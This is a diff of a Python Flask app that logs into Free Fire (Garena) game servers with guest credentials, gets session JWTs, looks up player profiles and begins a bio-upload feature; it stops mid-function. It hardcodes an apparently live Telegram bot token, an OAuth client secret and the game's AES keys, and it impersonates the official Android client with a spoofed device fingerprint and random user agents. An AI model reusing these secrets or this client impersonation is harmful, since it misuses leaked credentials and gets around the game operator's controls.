@@ -1,145 +1,356 @@
-"""
-FREE FIRE PLAYER LOOKUP - VERCEL READY
-Sync only | No asyncio | Serverless compatible
-"""
-
-import json
-import sys
-import base64
-import re
-import os
+# app.py - FULL VERSION (YOUR WORKING CODE + STANDALONE PLAYER FETCH)
+from flask import Flask, request, jsonify, make_response
 import requests
-import urllib3
+import binascii
+import random
+import time
+import json
+import re
+import base64
+import os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
 from datetime import datetime
-from flask import Flask, request, jsonify
+from google.protobuf import descriptor as _descriptor
+from google.protobuf import descriptor_pool as _descriptor_pool
+from google.protobuf import symbol_database as _symbol_database
+from google.protobuf import runtime_version as _runtime_version
+from google.protobuf.internal import builder as _builder
+from google.protobuf.json_format import MessageToJson, ParseDict
+import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ==================== EMBED PROTOBUF ====================
-from google.protobuf import descriptor as _descriptor
-from google.protobuf import descriptor_pool as _descriptor_pool
-from google.protobuf import runtime_version as _runtime_version
-from google.protobuf import symbol_database as _symbol_database
-from google.protobuf.internal import builder as _builder
-from google.protobuf import json_format as _json_format
+app = Flask(__name__)
 
-os.environ['PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION'] = 'python'
+# ============ PROTOBUF SETUP (YOUR EXISTING) ============
+_sym_db = _symbol_database.Default()
 
-# FreeFire.proto
-_runtime_version.ValidateProtobufRuntimeVersion(_runtime_version.Domain.PUBLIC, 6, 30, 0, '', 'FreeFire.proto')
-FF_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x0e\x46reeFire.proto\"c\n\x08LoginReq\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0blogin_token\x18\x1d \x01(\t\x12\x1b\n\x13orign_platform_type\x18\x63 \x01(\t\"]\n\x10\x42lacklistInfoRes\x12\x1e\n\nban_reason\x18\x01 \x01(\x0e\x32\n.BanReason\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\r\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\r\"f\n\x0eLoginQueueInfo\x12\r\n\x05\x61llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\r\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\r\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\"\xa0\x03\n\x08LoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x04\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\x19\n\x11recommend_regions\x18\x07 \x03(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\r\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0b \x01(\r\x12$\n\tblacklist\x18\x0c \x01(\x0b\x32\x11.BlacklistInfoRes\x12#\n\nqueue_info\x18\r \x01(\x0b\x32\x0f.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x0e \x01(\t\x12\x15\n\rapp_server_id\x18\x0f \x01(\r\x12\x0f\n\x07\x61no_url\x18\x10 \x01(\t\x12\x0f\n\x07ip_city\x18\x11 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x12 \x01(\t*\xa8\x01\n\tBanReason\x12\x16\n\x12\x42\x41N_REASON_UNKNOWN\x10\x00\x12\x1b\n\x17\x42\x41N_REASON_IN_GAME_AUTO\x10\x01\x12\x15\n\x11\x42\x41N_REASON_REFUND\x10\x02\x12\x15\n\x11\x42\x41N_REASON_OTHERS\x10\x03\x12\x16\n\x12\x42\x41N_REASON_SKINMOD\x10\x04\x12 \n\x1b\x42\x41N_REASON_IN_GAME_AUTO_NEW\x10\xf6\x07\x62\x06proto3')
-_g = {}
-_builder.BuildMessageAndEnumDescriptors(FF_DESC, _g)
-_builder.BuildTopDescriptorsAndMessages(FF_DESC, 'FreeFire_pb2', _g)
-LoginReq = _g['LoginReq']
-LoginRes = _g['LoginRes']
+_runtime_version.ValidateProtobufRuntimeVersion(_runtime_version.Domain.PUBLIC, 6, 30, 0, '', 'MajorLoginRes.proto')
 
-# main.proto
-MAIN_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x0csample.proto\"*\n\x12SearchWorkshopCode\x12\t\n\x01\x61\x18\x01 \x01(\t\x12\t\n\x01\x62\x18\x02 \x01(\x05\"-\n\x15GetPlayerPersonalShow\x12\t\n\x01\x61\x18\x01 \x01(\x03\x12\t\n\x01\x62\x18\x02 \x01(\x05\x62\x06proto3')
-_g2 = {}
-_builder.BuildMessageAndEnumDescriptors(MAIN_DESC, _g2)
-_builder.BuildTopDescriptorsAndMessages(MAIN_DESC, 'main_pb2', _g2)
-GetPlayerPersonalShow = _g2['GetPlayerPersonalShow']
+_req_desc = _descriptor_pool.Default().AddSerializedFile(
+    b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t'
+    b'\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05'
+    b'\x12\x16\n\x0eclient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t'
+    b'\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t'
+    b'\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r'
+    b'\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t'
+    b'\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r'
+    b'\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t'
+    b'\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t'
+    b'\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t'
+    b'\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0bdevice_type\x18\x18 \x01(\t'
+    b"\x12'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity"
+    b'\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05'
+    b'\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t'
+    b'\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t'
+    b'\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05'
+    b'\x12"\n\x1a\x65xternal_storage_available\x18= \x01(\x05'
+    b'\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05'
+    b'\x12"\n\x1ainternal_storage_available\x18? \x01(\x05'
+    b'\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05'
+    b'\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05'
+    b'\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05'
+    b'\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05'
+    b'\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t'
+    b'\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t'
+    b'\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05'
+    b'\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t'
+    b'\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t'
+    b'\x12\x14\n\x0cgraphics_api\x18V \x01(\t'
+    b'\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r'
+    b'\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05'
+    b'\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c'
+    b'\x12\x14\n\x0cloading_time\x18\\ \x01(\r'
+    b'\x12\x17\n\x0frelease_channel\x18] \x01(\t'
+    b'\x12\x12\n\nextra_info\x18^ \x01(\t'
+    b'\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r'
+    b'\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05'
+    b'\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t'
+    b'\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t'
+    b'"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05'
+    b'\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3'
+)
 
-# AccountPersonalShow.proto
+_req_globals = {}
+_builder.BuildMessageAndEnumDescriptors(_req_desc, _req_globals)
+_builder.BuildTopDescriptorsAndMessages(_req_desc, 'MajorLoginReq_pb2', _req_globals)
+MajorLogin = _req_globals['MajorLogin']
+
+_res_desc = _descriptor_pool.Default().AddSerializedFile(
+    b'\n\x13MajorLoginRes.proto"|\n\rMajorLoginRes'
+    b'\x12\x13\n\x0b\x61\x63\x63ount_uid\x18\x01 \x01(\x04'
+    b'\x12\x0e\n\x06region\x18\x02 \x01(\t'
+    b'\x12\r\n\x05token\x18\x08 \x01(\t'
+    b'\x12\x0b\n\x03url\x18\n \x01(\t'
+    b'\x12\x11\n\ttimestamp\x18\x15 \x01(\x03'
+    b'\x12\x0b\n\x03key\x18\x16 \x01(\x0c'
+    b'\x12\n\n\x02iv\x18\x17 \x01(\x0c\x62\x06proto3'
+)
+
+_res_globals = {}
+_builder.BuildMessageAndEnumDescriptors(_res_desc, _res_globals)
+_builder.BuildTopDescriptorsAndMessages(_res_desc, 'MajorLoginRes_pb2', _res_globals)
+MajorLoginRes = _res_globals['MajorLoginRes']
+
+# ============ ADD: STANDALONE PLAYER FETCH PROTOS ============
 _runtime_version.ValidateProtobufRuntimeVersion(_runtime_version.Domain.PUBLIC, 6, 33, 1, '', 'AccountPersonalShow.proto')
-APS_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x19\x41\x63\x63ountPersonalShow.proto\x12\x08\x66reefire\"\xac\x17\n\x10\x41\x63\x63ountInfoBasic\x12\x17\n\naccount_id\x18\x01 \x01(\x04H\x00\x88\x01\x01\x12\x15\n\x08nickname\x18\x03 \x01(\tH\x02\x88\x01\x01\x12\x13\n\x06region\x18\x05 \x01(\tH\x04\x88\x01\x01\x12\x12\n\x05level\x18\x06 \x01(\rH\x05\x88\x01\x01\x12\x11\n\x04rank\x18\x0e \x01(\rH\r\x88\x01\x01\x12\x1b\n\x0eranking_points\x18\x0f \x01(\rH\x0e\x88\x01\x01\x12\x12\n\x05liked\x18\x15 \x01(\rH\x14\x88\x01\x01\x12\x1a\n\rlast_login_at\x18\x18 \x01(\x03H\x17\x88\x01\x01\x12\x14\n\x07\x63s_rank\x18\x1e \x01(\rH\x1d\x88\x01\x01\x12\x16\n\tcreate_at\x18, \x01(\x03H*\x88\x01\x01\x12\x14\n\x07\x63lan_id\x18\x36 \x01(\x04H3\x88\x01\x01\x12\x16\n\tclan_name\x18\r \x01(\tH\x0c\x88\x01\x01\x42\r\n\x0b_account_idB\x0b\n\t_nicknameB\t\n\x07_regionB\x08\n\x06_levelB\x07\n\x05_rankB\x11\n\x0f_ranking_pointsB\x08\n\x06_likedB\x10\n\x0e_last_login_atB\n\n\x08_cs_rankB\x0c\n\n_create_atB\n\n\x08_clan_idB\x0c\n\n_clan_name\"\x98\x05\n\rAvatarProfile\x12\x16\n\tavatar_id\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x0f\n\x07\x63lothes\x18\x04 \x03(\r\x12\x16\n\x0e\x65quiped_skills\x18\x05 \x03(\r\x42\x0c\n\n_avatar_id\"\xd5\x05\n\x0fSocialBasicInfo\x12\x16\n\tsignature\x18\t \x01(\tH\x06\x88\x01\x01\x42\x0c\n\n_signature\"\x9d\x02\n\rClanInfoBasic\x12\x16\n\tclan_name\x18\x02 \x01(\tH\x01\x88\x01\x01\x12\x17\n\nclan_level\x18\x04 \x01(\rH\x03\x88\x01\x01\x42\x0c\n\n_clan_nameB\r\n\x0b_clan_level\"<\n\x0e\x44iamondCostRes\x12\x19\n\x0c\x64iamond_cost\x18\x01 \x01(\rH\x00\x88\x01\x01\x42\x0f\n\r_diamond_cost\"\xfd\x03\n\x14\x43reditScoreInfoBasic\x12\x19\n\x0c\x63redit_score\x18\x01 \x01(\rH\x00\x88\x01\x01\x42\x0f\n\r_credit_score\"\xfa\x06\n\x17\x41\x63\x63ountPersonalShowInfo\x12\x33\n\nbasic_info\x18\x01 \x01(\x0b\x32\x1a.freefire.AccountInfoBasicH\x00\x88\x01\x01\x12\x32\n\x0cprofile_info\x18\x02 \x01(\x0b\x32\x17.freefire.AvatarProfileH\x01\x88\x01\x01\x12\x35\n\x0f\x63lan_basic_info\x18\x06 \x01(\x0b\x32\x17.freefire.ClanInfoBasicH\x03\x88\x01\x01\x12\x33\n\x0bsocial_info\x18\t \x01(\x0b\x32\x19.freefire.SocialBasicInfoH\x06\x88\x01\x01\x12\x37\n\x10\x64iamond_cost_res\x18\n \x01(\x0b\x32\x18.freefire.DiamondCostResH\x07\x88\x01\x01\x12>\n\x11\x63redit_score_info\x18\x0b \x01(\x0b\x32\x1e.freefire.CreditScoreInfoBasicH\x08\x88\x01\x01\x42\r\n\x0b_basic_infoB\x0f\n\r_profile_infoB\x12\n\x10_clan_basic_infoB\x0e\n\x0c_social_infoB\x13\n\x11_diamond_cost_resB\x14\n\x12_credit_score_info\"\x99\x02\n\x0b\x42\x61sicEPInfo\x12\x17\n\nevent_name\x18\x07 \x01(\tH\x06\x88\x01\x01\x42\r\n\x0b_event_name*\xa0\x01\n\x10VeteranLeaveDays\x12\x19\n\x15VeteranLeaveDays_NONE\x10\x00*w\n\x14PreVeteranActionType\x12\x1d\n\x19PreVeteranActionType_NONE\x10\x00*s\n\x12\x45xternalIconStatus\x12\x1b\n\x17\x45xternalIconStatus_NONE\x10\x00*t\n\x14\x45xternalIconShowType\x12\x1d\n\x19\x45xternalIconShowType_NONE\x10\x00*\xf0\x02\n\tHighLight\x12\x12\n\x0eHighLight_NONE\x10\x00*T\n\x06Gender\x12\x0f\n\x0bGender_NONE\x10\x00*\xf5\x03\n\x08Language\x12\x11\n\rLanguage_NONE\x10\x00*l\n\nTimeOnline\x12\x13\n\x0fTimeOnline_NONE\x10\x00*\x84\x01\n\nTimeActive\x12\x13\n\x0fTimeActive_NONE\x10\x00*\xf6\x02\n\x11PlayerBattleTagID\x12\x1a\n\x16PlayerBattleTagID_NONE\x10\x00*\xe4\x01\n\tSocialTag\x12\x12\n\x0eSocialTag_NONE\x10\x00*\x80\x01\n\nModePrefer\x12\x13\n\x0fModePrefer_NONE\x10\x00*X\n\x08RankShow\x12\x11\n\rRankShow_NONE\x10\x00*L\n\x1b\x45LeaderBoardTitleRegionType\x12\x08\n\x04None\x10\x00*6\n\nUnlockType\x12\x13\n\x0fUnlockType_NONE\x10\x00*E\n\x0b\x45quipSource\x12\x14\n\x10\x45quipSource_SELF\x10\x00*\xfa\x01\n\x08NewsType\x12\x11\n\rNewsType_NONE\x10\x00*]\n\x0bRewardState\x12\x18\n\x14REWARD_STATE_INVALID\x10\x00\x62\x06proto3')
-_g3 = {}
-_builder.BuildMessageAndEnumDescriptors(APS_DESC, _g3)
-_builder.BuildTopDescriptorsAndMessages(APS_DESC, 'AccountPersonalShow_pb2', _g3)
-AccountPersonalShowInfo = _g3['AccountPersonalShowInfo']
+APS_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x19\x41\x63\x63ountPersonalShow.proto\x12\x08\x66reefire\"\xac\x17\n\x10\x41\x63\x63ountInfoBasic\x12\x17\n\naccount_id\x18\x01 \x01(\x04H\x00\x88\x01\x01\x12\x15\n\x08nickname\x18\x03 \x01(\tH\x02\x88\x01\x01\x12\x13\n\x06region\x18\x05 \x01(\tH\x04\x88\x01\x01\x12\x12\n\x05level\x18\x06 \x01(\rH\x05\x88\x01\x01\x12\x11\n\x04rank\x18\x0e \x01(\rH\r\x88\x01\x01\x12\x1b\n\x0eranking_points\x18\x0f \x01(\rH\x0e\x88\x01\x01\x12\x12\n\x05liked\x18\x15 \x01(\rH\x14\x88\x01\x01\x12\x1a\n\rlast_login_at\x18\x18 \x01(\x03H\x17\x88\x01\x01\x12\x14\n\x07\x63s_rank\x18\x1e \x01(\rH\x1d\x88\x01\x01\x12\x16\n\tcreate_at\x18, \x01(\x03H*\x88\x01\x01\x12\x16\n\tclan_name\x18\r \x01(\tH\x0c\x88\x01\x01\"\x98\x05\n\rAvatarProfile\x12\x16\n\tavatar_id\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x0f\n\x07\x63lothes\x18\x04 \x03(\r\x12\x16\n\x0e\x65quiped_skills\x18\x05 \x03(\r\"\xd5\x05\n\x0fSocialBasicInfo\x12\x16\n\tsignature\x18\t \x01(\tH\x06\x88\x01\x01\"\x9d\x02\n\rClanInfoBasic\x12\x16\n\tclan_name\x18\x02 \x01(\tH\x01\x88\x01\x01\x12\x17\n\nclan_level\x18\x04 \x01(\rH\x03\x88\x01\x01\"<\n\x0e\x44iamondCostRes\x12\x19\n\x0c\x64iamond_cost\x18\x01 \x01(\rH\x00\x88\x01\x01\"\xfd\x03\n\x14\x43reditScoreInfoBasic\x12\x19\n\x0c\x63redit_score\x18\x01 \x01(\rH\x00\x88\x01\x01\"\xfa\x06\n\x17\x41\x63\x63ountPersonalShowInfo\x12\x33\n\nbasic_info\x18\x01 \x01(\x0b\x32\x1a.freefire.AccountInfoBasicH\x00\x88\x01\x01\x12\x32\n\x0cprofile_info\x18\x02 \x01(\x0b\x32\x17.freefire.AvatarProfileH\x01\x88\x01\x01\x12\x35\n\x0f\x63lan_basic_info\x18\x06 \x01(\x0b\x32\x17.freefire.ClanInfoBasicH\x03\x88\x01\x01\x12\x33\n\x0bsocial_info\x18\t \x01(\x0b\x32\x19.freefire.SocialBasicInfoH\x06\x88\x01\x01\x12\x37\n\x10\x64iamond_cost_res\x18\n \x01(\x0b\x32\x18.freefire.DiamondCostResH\x07\x88\x01\x01\x12>\n\x11\x63redit_score_info\x18\x0b \x01(\x0b\x32\x1e.freefire.CreditScoreInfoBasicH\x08\x88\x01\x01\x62\x06proto3')
+_aps_g = {}
+_builder.BuildMessageAndEnumDescriptors(APS_DESC, _aps_g)
+_builder.BuildTopDescriptorsAndMessages(APS_DESC, 'AccountPersonalShow_pb2', _aps_g)
+AccountPersonalShowInfo = _aps_g['AccountPersonalShowInfo']
 
-# ==================== CONFIG ====================
-from Crypto.Cipher import AES as CryptoAES
-G = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
-F = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
+MAIN_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x0csample.proto\"-\n\x15GetPlayerPersonalShow\x12\t\n\x01\x61\x18\x01 \x01(\x03\x12\t\n\x01\x62\x18\x02 \x01(\x05\x62\x06proto3')
+_main_g = {}
+_builder.BuildMessageAndEnumDescriptors(MAIN_DESC, _main_g)
+_builder.BuildTopDescriptorsAndMessages(MAIN_DESC, 'main_pb2', _main_g)
+GetPlayerPersonalShow = _main_g['GetPlayerPersonalShow']
+
+# ============ CONFIG ============
+AES_KEY = b'Yg&tc%DEuh6%Zc^8'
+AES_IV = b'6oyZDr22E3ychjM%'
+GARENA_OAUTH_URL = "https://100067.connect.garena.com/oauth/guest/token/grant"
+MAJORLOGIN_URL = "https://loginbp.ggblueshark.com/MajorLogin"
+CLIENT_SECRET = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3"
+CLIENT_ID = "100067"
+
+HTTP_HEADERS = {
+    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)',
+    'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip',
+    'Content-Type': 'application/x-www-form-urlencoded', 'Expect': '100-continue',
+    'X-Unity-Version': '2018.4.11f1', 'X-GA': 'v1 1', 'ReleaseVersion': 'OB54',
+}
 
 BOT_TOKEN = "8965307683:AAGXwuIge4QKuYXtrkXhG4AahxDrynqi7SY"
 OWNER_ID = 8660700322
 CHANNEL_PROMO = "@dindingijo"
-SERVER_URL = "https://clientbp.ggpolarbear.com"
 
-app = Flask(__name__)
+FREEFIRE_UPDATE_URLS = [
+    "https://clientbp.ggblueshark.com/UpdateSocialBasicInfo",
+    "https://clientbp.common.ggbluefox.com/UpdateSocialBasicInfo",
+]
 
-# ==================== HELPERS (SYNC ONLY!) ====================
-def pad(d): 
-    l = CryptoAES.block_size - (len(d) % CryptoAES.block_size)
-    return d + bytes([l] * l)
+KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
+IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
 
-def encrypt(d): 
-    return CryptoAES.new(G, CryptoAES.MODE_CBC, F).encrypt(pad(d))
+BIO_HEADERS = {
+    "Expect": "100-continue", "X-Unity-Version": "2018.4.11f1", "X-GA": "v1 1",
+    "ReleaseVersion": "OB54", "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
+    "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
+}
 
-def parse_pb(d, mt): 
-    m = mt()
-    m.ParseFromString(d)
-    return m
+# ============ ENCRYPT / UTILS ============
+def aes_encrypt_data(data):
+    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
+    return cipher.encrypt(pad(data, AES.block_size))
 
-def decode_jwt(token):
+def random_ua():
+    versions = ['4.0.18P6', '4.0.19P7', '4.1.0P3', '5.0.1B2', '5.2.5P3']
+    models = ['SM-A125F', 'POCO M3', 'Redmi 9A', 'RMX2185', 'ASUS_Z01QD']
+    android = random.choice(['9', '10', '11', '12', '13'])
+    lang = random.choice(['en-US', 'hi-IN', 'pt-BR', 'id-ID'])
+    country = random.choice(['USA', 'IND', 'BRA', 'IDN'])
+    return f"GarenaMSDK/{random.choice(versions)}({random.choice(models)};Android {android};{lang};{country};)"
+
+def decode_jwt_manual(jwt_token):
     try:
-        parts = token.split('.')
+        parts = jwt_token.split('.')
         if len(parts) < 2: return None
         p = parts[1]
-        p += '=' * (4 - len(p) % 4) if len(p) % 4 else ''
-        return json.loads(base64.b64decode(p))
+        padding = 4 - len(p) % 4
+        if padding != 4: p += '=' * padding
+        return json.loads(base64.urlsafe_b64decode(p))
     except: return None
 
-# ==================== SYNC GEN TOKEN ====================
-def gen_token_sync(uid, password):
-    """Generate token - FULLY SYNC"""
-    try:
-        # Step 1: OAuth
-        data = f"uid={uid}&password={password}&response_type=token&client_type=2&client_secret=2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3&client_id=100067"
-        r = requests.post(
-            "https://ffmconnect.live.gop.garenanow.com/oauth/guest/token/grant",
-            data=data,
-            headers={'Content-Type': "application/x-www-form-urlencoded"},
-            timeout=30
-        )
-        d = r.json()
-        token, oid = d.get("access_token", "0"), d.get("open_id", "0")
-        if token == "0": return None
-        
-        # Step 2: Build LoginReq
-        m = LoginReq()
-        _json_format.ParseDict({"open_id": oid, "open_id_type": "4", "login_token": token, "orign_platform_type": "4"}, m)
-        pb = encrypt(m.SerializeToString())
-        
-        # Step 3: MajorLogin
-        r = requests.post(
-            "https://loginbp.ggpolarbear.com/MajorLogin",
-            data=pb,
-            headers={'Content-Type': "application/octet-stream", 'X-Unity-Version': "2018.4.11f1", 'X-GA': "v1 1", 'ReleaseVersion': "OB54"},
-            timeout=30
-        )
-        if r.status_code == 200:
-            msg = json.loads(_json_format.MessageToJson(parse_pb(r.content, LoginRes)))
-            return f"Bearer {msg.get('token', '0')}"
-        return None
-    except Exception as e:
-        print(f"Token gen error: {e}")
-        return None
+def get_account_id_from_jwt(jwt_token):
+    d = decode_jwt_manual(jwt_token)
+    return (d.get("account_id") or d.get("sub")) if d else None
 
-# ==================== SYNC FETCH PLAYER ====================
-def fetch_player_sync(uid, token):
-    """Fetch player data - FULLY SYNC"""
+def get_open_id_from_jwt(jwt_token):
+    d = decode_jwt_manual(jwt_token)
+    return (d.get("external_id") or d.get("open_id")) if d else None
+
+def get_region_from_jwt(jwt_token):
+    d = decode_jwt_manual(jwt_token)
+    return (d.get("country_code") or d.get("lock_region", "ID")) if d else "ID"
+
+# ============ JWT GENERATOR (YOUR EXISTING) ============
+def get_garena_tokens_sync(uid, password):
+    headers = dict(HTTP_HEADERS)
+    headers["User-Agent"] = random_ua()
+    headers["Host"] = "100067.connect.garena.com"
+    headers["Accept-Encoding"] = "gzip, deflate, br"
+    headers["Connection"] = "close"
+    payload = {"uid": uid, "password": password, "response_type": "token", "client_type": "2", "client_secret": CLIENT_SECRET, "client_id": CLIENT_ID}
+    try:
+        resp = requests.post(GARENA_OAUTH_URL, headers=headers, data=payload, timeout=15, verify=False)
+        if resp.status_code != 200: return None
+        body = resp.json()
+        open_id = body.get("open_id")
+        access_token = body.get("access_token")
+        if not open_id or not access_token: return None
+        return {"open_id": open_id, "access_token": access_token}
+    except: return None
+
+def build_major_login_payload_sync(open_id, access_token):
+    ml = MajorLogin()
+    ml.event_time = str(datetime.now())[:-7]
+    ml.game_name = "free fire"
+    ml.platform_id = 1
+    ml.client_version = "2.124.1"
+    ml.system_software = "Android OS 9 / API-28 (PQ3B.190801.10101846/G9650ZHU2ARC6)"
+    ml.system_hardware = "Handheld"
+    ml.telecom_operator = "Verizon"
+    ml.network_type = "WIFI"
+    ml.screen_width = 1920
+    ml.screen_height = 1080
+    ml.screen_dpi = "280"
+    ml.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
+    ml.memory = 3003
+    ml.gpu_renderer = "Adreno (TM) 640"
+    ml.gpu_version = "OpenGL ES 3.1 v1.46"
+    ml.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
+    ml.client_ip = "223.191.51.89"
+    ml.language = "en"
+    ml.open_id = open_id
+    ml.open_id_type = "4"
+    ml.device_type = "Handheld"
+    ml.memory_available.version = 55
+    ml.memory_available.hidden_value = 81
+    ml.access_token = access_token
+    ml.platform_sdk_id = 1
+    ml.network_operator_a = "Verizon"
+    ml.network_type_a = "WIFI"
+    ml.client_using_version = "7428b253defc164018c604a1ebbfebdf"
+    ml.external_storage_total = 36235
+    ml.external_storage_available = 31335
+    ml.internal_storage_total = 2519
+    ml.internal_storage_available = 703
+    ml.game_disk_storage_available = 25010
+    ml.game_disk_storage_total = 26628
+    ml.external_sdcard_avail_storage = 32992
+    ml.external_sdcard_total_storage = 36235
+    ml.login_by = 3
+    ml.library_path = "/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/lib/arm64"
+    ml.reg_avatar = 1
+    ml.library_token = "5b892aaabd688e571f688053118a162b|/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/base.apk"
+    ml.channel_type = 3
+    ml.cpu_type = 2
+    ml.cpu_architecture = "64"
+    ml.client_version_code = "2019118695"
+    ml.graphics_api = "OpenGLES2"
+    ml.supported_astc_bitset = 16383
+    ml.login_open_id_type = 4
+    ml.analytics_detail = b"FwQVTgUPX1UaUllDDwcWCRBpWA0FUgsvA1snWlBaO1kFYg=="
+    ml.loading_time = 13564
+    ml.release_channel = "android"
+    ml.extra_info = "KqsHTymw5/5GB23YGniUYN2/q47GATrq7eFeRatf0NkwLKEMQ0PK5BKEk72dPflAxUlEBir6Vtey83XqF593qsl8hwY="
+    ml.android_engine_init_flag = 110009
+    ml.if_push = 1
+    ml.is_vpn = 1
+    ml.origin_platform_type = "4"
+    ml.primary_platform_type = "4"
+    return aes_encrypt_data(ml.SerializeToString())
+
+def major_login_sync(encrypted_payload):
+    try:
+        resp = requests.post(MAJORLOGIN_URL, data=encrypted_payload, headers=HTTP_HEADERS, timeout=15, verify=False)
+        if resp.status_code != 200: return None
+        raw = resp.content
+        proto = MajorLoginRes()
+        proto.ParseFromString(raw)
+        return {"token": proto.token, "region": proto.region, "url": proto.url, "tcp_key": proto.key.hex() if proto.key else None, "tcp_iv": proto.iv.hex() if proto.iv else None}
+    except: return None
+
+def generate_jwt_sync(uid, password):
+    try:
+        oauth = get_garena_tokens_sync(uid, password)
+        if not oauth: return None
+        encrypted = build_major_login_payload_sync(oauth["open_id"], oauth["access_token"])
+        result = major_login_sync(encrypted)
+        if not result: return None
+        return {"open_id": oauth["open_id"], "access_token": oauth["access_token"], **result}
+    except: return None
+
+# ============ BIO UPLOAD ============
+def encrypt_data(data_bytes):
+    cipher = AES.new(KEY, AES.MODE_CBC, IV)
+    return cipher.encrypt(pad(data_bytes, AES.block_size))
+
+def encode_varint(n):
+    result = []
+    while True:
+        byte = n & 0x7F
+        n >>= 7
+        if n: byte |= 0x80
+        result.append(byte)
+        if not n: break
+    return bytes(result)
+
+def build_bio_payload(bio_text):
